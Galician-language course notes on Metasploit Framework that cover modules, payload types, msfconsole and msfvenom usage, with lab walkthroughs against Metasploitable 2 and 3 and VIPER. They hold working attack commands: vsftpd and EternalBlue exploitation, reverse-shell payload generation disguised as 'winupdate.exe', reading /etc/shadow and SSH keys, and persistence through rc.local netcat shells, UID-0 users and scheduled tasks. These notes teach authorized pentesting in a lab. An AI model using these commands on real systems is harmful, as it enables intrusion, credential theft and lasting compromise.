    Metasploit Framework

    Que atoparás aquí

    Base teórica de Metasploit Framework (MSF): que é, os seus compoñentes, o fluxo de traballo, os comandos básicos, Meterpreter, post-explotación e persistencia. Estes conceptos empréganse despois nas prácticas Metasploitable 2 – Pentest completo paso a paso, Metasploitable 3 – Pentest paso a paso en contorno moderno e Simulación de Ataques con VIPER.

    En Metasploitable 2 e 3 trabállase directamente con msfconsole, msfvenom e Meterpreter (obxectivos GNU/Linux e Windows, respectivamente), mentres que VIPER é, en esencia, unha interface web sobre Metasploit (ver VIPER: arquitectura sobre Metasploit).

    Sitio oficial: metasploit.com · Documentación: docs.metasploit.com · Código: github.com/rapid7/metasploit-framework

    1. Que é Metasploit

    Metasploit Framework é a plataforma de explotación máis empregada en pentesting. Mantida por Rapid7, é de código aberto e reúne nunha soa ferramenta todo o ciclo dun ataque: buscar unha vulnerabilidade, explotala, obter unha sesión na máquina comprometida e realizar accións de post-explotación (recoller información, escalar privilexios, moverse lateralmente, manter persistencia).

    A súa forza é a modularidade: miles de exploits, payloads e utilidades que se combinan como pezas, sempre coa mesma interface de comandos (msfconsole). Por iso é a base de ferramentas de nivel superior como VIPER (ver apuntamentos de VIPER).

    Uso ético e legal

    Metasploit é unha ferramenta ofensiva. Úsase só sobre sistemas propios ou cunha autorización expresa por escrito, en contornas controladas (como o laboratorio da práctica). Fóra diso é ilegal.

    2. Compoñentes e tipos de módulo

    • msfconsole: a consola interactiva principal (a mesma que atoparás na pestana MsfConsole de VIPER).
    • Base de datos (PostgreSQL): Metasploit pode gardar hosts, servizos, credenciais e resultados de escaneos nun workspace. Arrínca­se con msfdb init.
    • msfvenom: xerador de payloads independentes (ficheiros .elf, .exe, etc.) — ver Xerar payloads con msfvenom.
    • Meterpreter: o payload avanzado de Metasploit (ver Payloads).

    Os módulos clasifícanse por tipo:

    Tipo Para que serve Exemplo
    exploit Aproveita unha vulnerabilidade para executar código exploit/windows/smb/psexec
    payload O código que se executa na vítima tras a explotación windows/x64/meterpreter/reverse_tcp
    auxiliary Escaneo, fuzzing, brute force, negación de servizo… (non entregan shell) auxiliary/scanner/smb/smb_version
    post Post-explotación (sobre unha sesión xa aberta) post/windows/gather/hashdump
    encoder Codifican o payload para evadir deteccións x86/shikata_ga_nai
    nop Xeran "no-operation" para axustar o tamaño/aliñamento x86/opty2

    3. Payloads: tipos e nomenclatura

    O payload é o que corre na vítima despois de explotala. A súa nomenclatura lese por partes, p.ex. windows/x64/meterpreter/reverse_tcp:

    • Plataforma/arquitectura: windows/x64, linux/x86…
    • Carga: meterpreter (avanzada, en memoria) ou shell (intérprete básico).
    • Conexión: reverse_tcp (a vítima conecta co atacante) ou bind_tcp (o atacante conecta coa vítima).

    Reverse vs. bind · staged vs. stageless · Meterpreter

    • Reverse (o habitual): a vítima inicia a conexión de saída cara ao atacante → evita os bloqueos de conexións entrantes dos cortalumes. Bind: o atacante conéctase a un porto que abre a vítima.
    • Staged (.../meterpreter/reverse_tcp, coa barra): envíase primeiro un stager pequeno que despois descarga a etapa grande. Stageless (.../meterpreter_reverse_tcp, co guión baixo): todo nunha peza.
    • Meterpreter: shell avanzada que reside en memoria e ofrece comandos propios (upload, download, getuid, hashdump, pivoting…). É a que usaremos na práctica. (Concepto en apuntamentos de VIPER.)

    4. Fluxo de traballo habitual

    O ciclo típico en msfconsole é sempre o mesmo:

    msfconsole                      # abrir a consola
search psexec                   # 1) buscar o módulo
use exploit/windows/smb/psexec  # 2) seleccionalo
show options                    # 3) ver os parámetros requiridos
set RHOSTS 192.168.120.102      # 4) configurar os parámetros
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run                             # 5) executar (alias: exploit)

    Parámetros máis comúns

    • RHOST / RHOSTS: equipo ou equipos remotos obxectivo. Algúns módulos empregan RHOST e outros RHOSTS; comproba sempre show options.
    • RPORT: porto remoto do servizo contra o que traballa o módulo.
    • LHOST / LPORT: IP e porto do equipo atacante onde se recibirá a conexión de retorno.
    • PAYLOAD: carga que se executará na vítima.
    • set fixa un valor; setg fíxao de forma global; show options e show payloads axudan a descubrir o que falta.

    5. Comandos básicos

    Consola (msfconsole)

    Comando Acción
    search <termo> Buscar módulos
    use <módulo> Seleccionar un módulo
    info Información e opcións do módulo actual
    show options / show payloads Ver parámetros / payloads compatibles
    set / setg / unset Fixar / fixar global / borrar un parámetro
    run / exploit Lanzar o módulo
    back Saír do módulo actual

    Xestión de sesións

    Comando Acción
    sessions -l Listar sesións activas
    sessions -i <id> Interactuar cunha sesión
    background (ou Ctrl+Z) Deixar a sesión actual en segundo plano
    sessions -k <id> Pechar unha sesión

    Dentro de Meterpreter

    Comando Acción
    sysinfo Información do sistema
    getuid Usuario baixo o que corremos
    upload / download Subir / baixar ficheiros
    execute -f <prog> -a "<args>" Executar un programa na vítima
    shell Abrir unha shell nativa do SO
    ps Listar os procesos do sistema
    migrate <pid> Mover a sesión de Meterpreter a outro proceso compatible
    hashdump Extraer os hashes de contrasinais locais cando os privilexios da sesión o permiten

    6. Xerar payloads con msfvenom

    msfvenom crea payloads como ficheiros autónomos (o que VIPER fai graficamente en Generate Payload):

    # Payload Linux (ELF), reverse TCP cara ao C2
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.120.100 LPORT=4444 -f elf > payload.elf

# Payload Windows (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.120.100 LPORT=5555 -f exe > payload.exe
    • -p payload · LHOST/LPORT destino de retorno · -f formato (elf, exe, raw…) · -e encoder · -o ficheiro de saída.
    • Para recibir a conexión dese payload cómpre un handler á escoita (ver Exemplos que se usan na práctica).

    7. Metasploit e Metasploitable 2

    A práctica Metasploitable 2 – Pentest completo paso a paso é a base (obxectivo GNU/Linux): emprégase Metasploit dende Kali para completar as fases de análise, explotación, post-explotación e persistencia contra unha máquina Ubuntu 8.04 chea de servizos antigos (FTP, SSH, Samba, Tomcat…).

    7.1. Relacionar vulnerabilidade e módulo

    Tras o escaneo, un dos servizos detectados é vsftpd 2.3.4. Búscase un exploit axeitado (por exemplo con searchsploit) e lévase ao módulo de Metasploit:

    search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

    Na práctica explótase o backdoor de vsftpd 2.3.4 (CVE-2011-2523): a versión 2.3.4 do servidor contiña unha porta traseira que, ao conectar cun usuario rematado en :), abría unha shell de root no porto TCP 6200.

    7.2. Explotación: unha shell, non Meterpreter

    msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.30
run

    Non todo exploit dá Meterpreter

    A diferenza de EternalBlue ou psexec (que entregan unha sesión Meterpreter), o backdoor de vsftpd devolve unha command shell nativa de Linux xa como root. Por iso aquí non se selecciona PAYLOAD: a propia porta traseira xa proporciona o acceso. É un bo exemplo de que unha sesión de Metasploit pode ser unha shell simple e non sempre Meterpreter.

    O paso a paso está na Fase 3: Explotación da práctica de Metasploitable 2.

    7.3. Post-explotación en Linux

    Cunha shell de root nun sistema Unix, a recolleita de información faise con comandos nativos (non con módulos post/windows):

    whoami
cat /etc/passwd
cat /etc/shadow
cat /home/msfadmin/.ssh/id_rsa

    Obter a clave privada id_rsa dun usuario permite despois acceder por SSH sen contrasinal. Detalle na Fase 4: Post-explotación.

    7.4. Persistencia en Linux

    A práctica mostra tres mecanismos de persistencia típicos en Linux (fronte á tarefa programada de Windows):

    • Reverse shell no arranque: engádese un nc ao /etc/rc.local que, tras cada reinicio, conecta de volta a un nc -lvp á escoita en Kali.
    • Clave SSH roubada: úsase o id_rsa obtido para entrar como root por SSH (ssh -i id_rsa …).
    • Usuario root permanente: créase un usuario novo con UID 0 (useradd -o -u 0 -g 0 …).

    Detalle na Fase 5: Persistencia.

    8. Metasploit e Metasploitable 3

    Na práctica Metasploitable 3 – Pentest paso a paso en contorno moderno emprégase Metasploit directamente dende Kali Linux para completar varias fases dun test de intrusión: análise, explotación, post-explotación e persistencia.

    8.1. Relacionar vulnerabilidade e módulo

    Unha vez identificados os servizos e vulnerabilidades do obxectivo, o seguinte paso é localizar un módulo axeitado en Metasploit. A procura pode facerse por nome, tecnoloxía ou identificador da vulnerabilidade:

    search ms17-010
search eternalblue

    Na práctica emprégase MS17-010 / EternalBlue, unha vulnerabilidade histórica de SMB en Microsoft Windows, co módulo:

    use exploit/windows/smb/ms17_010_eternalblue

    Antes de executar un módulo

    Non abonda con coñecer o nome dunha vulnerabilidade. Cómpre comprobar que o sistema obxectivo presenta o servizo, a versión e as condicións necesarias para o módulo. En Metasploit, info e show options permiten revisar estes requisitos e parámetros.

    Na práctica de Metasploitable 3 desactívase o cortalumes da máquina Windows para facer accesible SMB dentro do laboratorio illado. Isto é unha condición creada para a práctica, non un requisito que deba reproducirse fóra dunha contorna controlada.

    8.2. Explotación con EternalBlue

    O esquema empregado na práctica é:

    msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST 192.168.56.39
set LHOST 192.168.56.29
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

    O significado é:

    • RHOST: IP da máquina Windows vulnerable.
    • LHOST: IP da máquina Kali á que debe regresar a conexión.
    • PAYLOAD: Meterpreter para Windows de 64 bits cunha conexión TCP inversa.
    • run: executa o módulo configurado.

    Se a explotación ten éxito, Metasploit abre unha sesión Meterpreter. O paso a paso completo está na Fase 3: Explotación da práctica de Metasploitable 3.

    8.3. Post-explotación con Meterpreter

    Unha sesión Meterpreter permite continuar a avaliación do sistema comprometido. Na práctica empréganse:

    getuid
sysinfo
hashdump
ps
migrate <PID>
    • getuid: identifica o usuario ou conta baixo a que se executa a sesión.
    • sysinfo: amosa información do sistema operativo e arquitectura.
    • hashdump: tenta obter os hashes das contas locais; require privilexios suficientes.
    • ps: lista os procesos en execución.
    • migrate <PID>: move Meterpreter a outro proceso compatible para mellorar a estabilidade ou situar a sesión no contexto dun proceso determinado.

    migrate non é persistencia

    Migrar Meterpreter a explorer.exe, lsass.exe ou outro proceso non fai que a sesión sobreviva a un reinicio. Se o proceso remata ou o equipo reinicia, a sesión desaparece.

    A migración pode mellorar a estabilidade da sesión ou permitir certas accións segundo os privilexios do proceso de destino, pero a persistencia real require un mecanismo que volva executar o código tras un reinicio ou inicio de sesión.

    O desenvolvemento práctico está na Fase 4: Post-explotación.

    8.4. Persistencia: handler + payload + tarefa programada

    Na práctica de Metasploitable 3 a persistencia constrúese explicitamente en tres partes:

    1. Deixar un multi/handler á escoita

    background
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.29
set LPORT 5555
set ExitOnSession false
run -j
    • background: deixa a sesión actual en segundo plano.
    • ExitOnSession false: fai que o handler continúe activo despois de recibir unha conexión.
    • run -j: executa o módulo como traballo (job) en segundo plano.

    2. Xerar un executable coa mesma configuración

    msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.29 LPORT=5555 \
  -f exe -o /tmp/winupdate.exe

    O PAYLOAD, LHOST e LPORT deben coincidir cos configurados no multi/handler.

    3. Subir o ficheiro e facer que Windows o execute de novo

    Dende Meterpreter:

    upload /tmp/winupdate.exe C:\\ProgramData\\WinUpdate

    A práctica crea despois unha tarefa programada de Windows que executa ese ficheiro ao iniciar sesión un usuario. Deste xeito, tras un reinicio, o payload pode volver conectar co multi/handler.

    Idea clave

    O multi/handler non crea a persistencia: só recibe a conexión.
    msfvenom non crea a persistencia: só xera o payload.
    A tarefa programada é o mecanismo que provoca a execución futura do payload e, polo tanto, permite recuperar unha sesión.

    O procedemento completo está na Fase 5: Persistencia.

    9. Metasploit e VIPER

    VIPER non substitúe a Metasploit: envólvea. A imaxe de VIPER xa trae o Metasploit Framework dentro do seu contedor, e a pestana MsfConsole do dashboard é exactamente a msfconsole que acabas de ver, executándose no servidor C2. Por iso:

    • O que fas na GUI de VIPER (crear handlers, xerar payloads, abrir sesións) traialo tamén facer cos comandos de Metasploit desta páxina.
    • Na práctica combinamos ambas: a GUI de VIPER para o cómodo, e a lapela MsfConsole para os comandos de multi/handler e psexec.

    (Fundamentos de VIPER en apuntamentos de VIPER, Red Team e C2.)

    10. Exemplos que se usan nas prácticas

    Estes son os bloques de Metasploit que aparecen nas prácticas Metasploitable 2 – Pentest completo paso a paso, Metasploitable 3 – Pentest paso a paso en contorno moderno e Simulación de Ataques con VIPER. Aquí explícase que fai cada un; o paso a paso con capturas está en cada práctica.

    a) Explotación do backdoor de vsftpd 2.3.4 (Metasploitable 2)

    use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.30
run
    Aproveita a porta traseira de vsftpd 2.3.4 e devolve unha command shell de root (non Meterpreter; non require PAYLOAD). (Fase 3 na práctica de Metasploitable 2.)

    b) Explotación de MS17-010 / EternalBlue (Metasploitable 3)

    use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.56.39
set LHOST 192.168.56.29
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

    Configura o módulo para atacar a máquina Windows vulnerable e recibir unha sesión Meterpreter na máquina Kali. (Fase 3 na práctica de Metasploitable 3.)

    c) Handler para recibir unha reverse shell (VIPER: Exemplo 1 e 2)

    use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.120.100     # IP do C2 (VIPER)
set LPORT 4444
run
    Pon a Metasploit á escoita: cando a vítima execute o payload, recíbese a sesión de Meterpreter. (Exemplo 1 na práctica.)

    d) Movemento lateral con psexec sobre SMB (VIPER: Exemplo 2)

    use exploit/windows/smb/psexec
set RHOSTS 192.168.120.102     # vítima Windows
set SMBUser usuario
set SMBPass abc123.
set LHOST 192.168.120.100
set LPORT 5555
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
    Autentícase por SMB con credenciais válidas, sobe un servizo e obtén sesión na vítima Windows. (Exemplo 2 na práctica.)

    e) Xestionar varias sesións (VIPER e Metasploitable 3)

    background              # deixar a sesión actual en segundo plano
sessions -l             # listar sesións
sessions -i <id>        # interactuar coa sesión da VM-3

    f) Persistencia dende Meterpreter (VIPER: Exemplo 3)

    meterpreter> upload /tmp/payload.exe C:\\Users\\usuario\\
meterpreter> execute -f powershell.exe -a "-Command schtasks /create /tn 'WinUpdate' /xml C:\Users\usuario\task.xml"
    Sobe o payload e crea unha tarefa programada que o reexecuta tras os reinicios. (Exemplo 3 na práctica.)

    11. Glosario rápido

    Termo Significado
    MSF Metasploit Framework.
    msfconsole Consola interactiva de Metasploit.
    msfvenom Xerador de payloads autónomos.
    Exploit Módulo que aproveita unha vulnerabilidade.
    Payload Código que corre na vítima tras a explotación.
    Handler Compoñente que escoita e recibe a conexión de volta do payload.
    Meterpreter Payload avanzado, en memoria e interactivo.
    Sesión Canal de control cunha máquina comprometida.
    RHOST / RHOSTS Equipo ou equipos remotos obxectivo dun módulo.
    LHOST / LPORT IP e porto locais aos que regresará unha conexión inversa.
    MS17-010 / EternalBlue Vulnerabilidade histórica de SMB en Windows empregada na práctica de Metasploitable 3.
    vsftpd 2.3.4 (backdoor) Porta traseira no servidor FTP vsftpd 2.3.4 (CVE-2011-2523) que abre unha shell de root no porto 6200; explótase en Metasploitable 2.
    Migración Movemento dunha sesión Meterpreter a outro proceso; non implica persistencia tras un reinicio.
    Job Módulo ou tarefa que Metasploit mantén executándose en segundo plano.
    Workspace Espazo na base de datos para organizar un obxectivo/proxecto.

    • Metasploitable 3 – Pentest paso a paso en contorno moderno (obxectivo Windows): EternalBlue, Meterpreter e msfvenom.
